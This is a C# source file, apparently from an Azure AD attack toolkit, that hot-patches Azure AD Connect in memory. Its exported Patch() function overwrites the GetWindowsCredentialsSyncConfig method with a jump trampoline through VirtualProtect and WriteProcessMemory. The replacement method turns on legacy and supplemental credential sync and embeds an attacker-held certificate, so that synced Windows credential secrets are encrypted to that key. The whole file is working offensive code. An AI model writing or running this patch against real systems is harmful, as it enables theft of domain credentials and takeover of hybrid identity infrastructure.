using RGiesecke.DllExport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using System.Reflection;

namespace DCaaS
{
    public class DCaaS
    {
        [DllExport]
        public static bool Patch()
        {

			bool ok = true;
			try
			{
				// Load DLL
				RegistryKey regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\AD Sync");
				string installationPath = (string)regKey.GetValue("Location", "C:\\Program Files\\Microsoft Azure AD Sync\\");
				string dll1 = installationPath + "Extensions\\Microsoft.Azure.ActiveDirectory.Connector.dll";
				Assembly asm1 = Assembly.LoadFile(dll1);
				string dll2 = installationPath + "Extensions\\Microsoft.Online.Coexistence.Schema.Ex.dll";
				Assembly asm2 = Assembly.LoadFile(dll2);
				
				// Load type and method
				Type typ1 = asm1.GetType("Microsoft.Azure.ActiveDirectory.Connector.ProvisioningServiceAdapter");
				MethodInfo oldOne = typ1.GetMethod("GetWindowsCredentialsSyncConfig", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);
				MethodInfo newOne = typeof(DCaaS).GetMethod("GetWindowsCredentialsSyncConfig", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);

				//JIT compile methods
				RuntimeHelpers.PrepareMethod(oldOne.MethodHandle);
				RuntimeHelpers.PrepareMethod(newOne.MethodHandle);

				//Get pointers to the functions
				IntPtr oldPtr = oldOne.MethodHandle.GetFunctionPointer();
				IntPtr newPtr = newOne.MethodHandle.GetFunctionPointer();

				// Create the trampoline
				byte[] trampoline = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
				byte[] address = BitConverter.GetBytes(newPtr.ToInt64());
				for (int i = 0; i < address.Length; i++)
				{
					trampoline[i + 2] = address[i];
				}

				//Temporarily change permissions to RWE
				uint oldprotect;
				if (!VirtualProtect(oldPtr, (UIntPtr)trampoline.Length, 0x40, out oldprotect))
				{
					throw new Exception("Could not change permissions to RWE");
				}

				//Apply the patch
				IntPtr written = IntPtr.Zero;
				if (!DCaaS.WriteProcessMemory(GetCurrentProcess(), oldPtr, trampoline, (uint)trampoline.Length, out written))
				{
					throw new Exception("Could not write the trampoline");
				}

				//Flush instruction cache to make sure our new code executes
				if (!FlushInstructionCache(GetCurrentProcess(), oldPtr, (UIntPtr)trampoline.Length))
				{
					throw new Exception("Could not flush the cache");
				}

				//Restore the original memory protection settings
				if (!VirtualProtect(oldPtr, (UIntPtr)trampoline.Length, oldprotect, out oldprotect))
				{
					throw new Exception("Could not restore protection settings");
				}
			}
			catch(Exception e)
            {
				ok = false;
            }

            return ok;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

		// Microsoft.Online.Coexistence.Schema.Ex.dll
		// Microsoft.Online.Coexistence.Schema
		public class WindowsCredentialsSyncConfig
        {

            public bool EnableWindowsLegacyCredentials { get; set; }
            public bool EnableWindowsSupplementalCredentials { get; set; }
            public byte[] SecretEncryptionCertificate { get; set; }
        }

		// Microsoft.Azure.ActiveDirectory.Connector.dll
		// Microsoft.Azure.ActiveDirectory.Connector.ProvisioningServiceAdapter
		[MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        internal WindowsCredentialsSyncConfig GetWindowsCredentialsSyncConfig()
        {
            WindowsCredentialsSyncConfig config = new WindowsCredentialsSyncConfig();
            config.EnableWindowsLegacyCredentials = true;
            config.EnableWindowsSupplementalCredentials = true;
            config.SecretEncryptionCertificate = Convert.FromBase64String("MIIC+DCCAeCgAwIBAgIQbStQ0RP2vZ5J3Jmw9nc7/zANBgkqhkiG9w0BAQsFADAXMRUwEwYDVQQDDAxBQURJbnRlcm5hbHMwHhcNMjMwODIxMTIyMTA0WhcNMzMwODIxMTIzMTA0WjAXMRUwEwYDVQQDDAxBQURJbnRlcm5hbHMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDinjh+Ti5DFJ6Koh7Ht8sNTX1cgIEBND16r/ZGuegYt6mCgqfrk5otpnCnsoiAotcMM9BDX/4/wWc047SJT591wJL6aWePb/k7jiAsXPWYauqh5pVIgmlIGMyHD1fUVZGG/N8dzY2+G0KWr7ZogtDLTkR7OqRQ3PaJoi3pmIer2tcRCxuYan4TSdlIW8bVS07fVokhvowrg4TSfVnPyHs7ti2n9nBWBoJcusHKxCVQKjMwFTZbX/5Df6+bc2iINpbdeaQmE/eSBuM418aiHwReaqa+w75/MVTtluRDaFUFvgmqHqW+oClT4OVlS3ZPNbi8VBMU4nU/pudVSGNtb/7FAgMBAAGjQDA+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAdBgNVHQ4EFgQUXlKwqj4w5WVZRRCk326ttMS8KJMwDQYJKoZIhvcNAQELBQADggEBABovqxR0mVKrbLsIHaxUQ4ZnAsUM3rOcPzZnkLvjLsyGOblY2ZrUjv4QFx8aSnu9iGc5nOXPtjJCOe1SepE0qiZHhHOcp+60BA7Bta/QUofIJkfjwzAqRE9OUXjc9EfgL57in1XzUu7K01D7aRdM+p//zYVNge5FYeTBy/qr4R4im8pweicY3ViY/ehTf5en5kN6owJm7oFe4bc+3GptrQthHm9wr7xggf2g47n5p+DpO8QLo94xX+KGzntkxo2wO9jrgD5Q/QmNY45YvKlv4TmcBQP9D6sHq2OkAQAM9F+r7llcNNeqdCOdbkV0dOfeP++6O59cpbxfcZ5biUF56UY=");

			return config;
        }
    }
}
